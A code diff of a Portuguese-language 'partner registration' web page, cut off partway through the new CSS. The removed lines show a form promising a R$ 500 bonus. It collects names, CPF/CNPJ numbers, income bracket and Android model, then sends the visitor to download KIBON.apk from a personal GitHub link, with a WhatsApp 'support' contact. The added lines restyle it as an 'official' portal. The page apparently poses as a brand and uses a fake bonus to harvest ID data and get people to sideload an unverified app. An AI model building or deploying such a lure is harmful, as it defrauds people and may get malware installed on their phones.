@@ -3,101 +3,89 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cadastro de Parceiros | Bônus R$ 500</title>
-    <style>
-        body { font-family: 'Arial', sans-serif; background-color: #f4f4f4; margin: 0; padding: 20px; }
-        .container { max-width: 600px; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); margin: auto; border-top: 10px solid #e2142d; }
-        h2 { color: #e2142d; text-align: center; }
-        .bonus-badge { background: #ffcc00; color: #000; padding: 10px; text-align: center; font-weight: bold; border-radius: 5px; margin-bottom: 20px; }
-        label { display: block; margin-top: 15px; font-weight: bold; color: #333; }
-        input, select { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
-        .btn-download { background-color: #e2142d; color: white; border: none; padding: 15px; width: 100%; border-radius: 5px; font-size: 18px; cursor: pointer; margin-top: 20px; font-weight: bold; }
-        .btn-whatsapp { background-color: #25d366; color: white; text-align: center; display: block; text-decoration: none; padding: 10px; border-radius: 5px; margin-top: 10px; font-weight: bold; }
-        .error { color: red; font-size: 12px; display: none; }
-    </style>
-</head>
-<body>
-
-<div class="container">
-    <h2>Seja um Parceiro</h2>
-    <div class="bonus-badge">🎁 CADASTRE-SE E RESGATE R$ 500,00 DE BÔNUS NO APP</div>
-
-    <form id="cadastroForm">
-        <label>Nome Completo / Razão Social</label>
-        <input type="text" placeholder="Digite seu nome ou empresa" required>
-
-        <label>CPF ou CNPJ</label>
-        <input type="text" id="documento" placeholder="000.000.000-00 ou 00.000.000/0001-00" onblur="validarDoc()" required>
-        <span id="docErro" class="error">Documento inválido. Verifique os números.</span>
-
-        <label>Estado (UF)</label>
-        <select id="estado" required>
-            <option value="">Selecione...</option>
-            <option value="AC">Acre</option><option value="AL">Alagoas</option><option value="AP">Amapá</option>
-            <option value="AM">Amazonas</option><option value="BA">Bahia</option><option value="CE">Ceará</option>
-            <option value="DF">Distrito Federal</option><option value="ES">Espírito Santo</option>
-            <option value="GO">Goiás</option><option value="MA">Maranhão</option><option value="MT">Mato Grosso</option>
-            <option value="MS">Mato Grosso do Sul</option><option value="MG">Minas Gerais</option>
-            <option value="PA">Pará</option><option value="PB">Paraíba</option><option value="PR">Paraná</option>
-            <option value="PE">Pernambuco</option><option value="PI">Piauí</option><option value="RJ">Rio de Janeiro</option>
-            <option value="RN">Rio Grande do Norte</option><option value="RS">Rio Grande do Sul</option>
-            <option value="RO">Rondônia</option><option value="RR">Roraima</option><option value="SC">Santa Catarina</option>
-            <option value="SP">São Paulo</option><option value="SE">Sergipe</option><option value="TO">Tocantins</option>
-        </select>
-
-        <label>Estimativa de Renda Mensal do Comércio</label>
-        <select required>
-            <option value="1">Até R$ 5.000</option>
-            <option value="2">R$ 5.000 a R$ 15.000</option>
-            <option value="3">R$ 15.000 a R$ 50.000</option>
-            <option value="4">Acima de R$ 50.000</option>
-        </select>
-
-        <label>Modelo do seu Aparelho Android</label>
-        <select id="androidModel">
-            <option value="generic">Detectar automaticamente...</option>
-            <option value="samsung">Samsung (Linha S, A, M, Note)</option>
-            <option value="motorola">Motorola (Moto G, Edge, One)</option>
-            <option value="xiaomi">Xiaomi / Redmi / Poco</option>
-            <option value="realme">Realme</option>
-            <option value="outro">Outro modelo Android</option>
-        </select>
-
-        <p style="font-size: 13px; color: #666; margin-top: 15px;">
-            * Após baixar, você poderá escolher o seu **Freezer** diretamente no catálogo do App.
-        </p>
-
-        <button type="button" class="btn-download" onclick="baixarApk()">BAIXAR APP E RESGATAR R$ 500</button>
-        
-        <a href="https://wa.me/555499422678" class="btn-whatsapp" target="_blank">SUPORTE VIA WHATSAPP</a>
-    </form>
-</div>
-
-<script>
-function validarDoc() {
-    const doc = document.getElementById('documento').value.replace(/\D/g, '');
-    const erro = document.getElementById('docErro');
+    <title>Portal do Parceiro | Cadastro Oficial</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     
-    // Lógica simplificada de validação (comprimento)
-    // Para uma validação real completa, seria necessário o algoritmo de dígitos verificadores
-    if (doc.length === 11 || doc.length === 14) {
-        erro.style.display = 'none';
-        return true;
-    } else {
-        erro.style.display = 'block';
-        return false;
-    }
-}
+    <style>
+        /* Reset e Configurações Básicas */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', sans-serif;
+        }
 
-function baixarApk() {
-    if (validarDoc()) {
-        alert("Cadastro validado! Seu bônus de R$ 500,00 foi liberado. O download começará agora.");
-        window.location.href = "https://github.com/thomasrinconn-max/kibon/raw/main/KIBON.apk"; 
-    } else {
-        alert("Por favor, insira um CPF ou CNPJ válido antes de baixar.");
-    }
-}
-</script>
+        body {
+            background-color: #f3f4f6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            color: #1f2937;
+        }
 
-</body>
-</html>
+        /* Container Principal */
+        .container {
+            width: 100%;
+            max-width: 550px;
+            background: #ffffff;
+            padding: 40px;
+            border-radius: 16px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
+            border-top: 6px solid #D31225;
+        }
+
+        /* Cabeçalho do Formulário */
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .header h2 {
+            color: #111827;
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .header p {
+            color: #6b7280;
+            font-size: 14px;
+        }
+
+        /* Alerta de Bônus */
+        .bonus-badge {
+            background: #fffbeb;
+            color: #b45309;
+            border: 1px solid #fde68a;
+            padding: 12px;
+            text-align: center;
+            font-weight: 600;
+            font-size: 14px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        /* Elementos de Formulário */
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #374151;
+            margin-bottom: 8px;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 12px 16px;
+            font-size: 15px;
+            border: 1
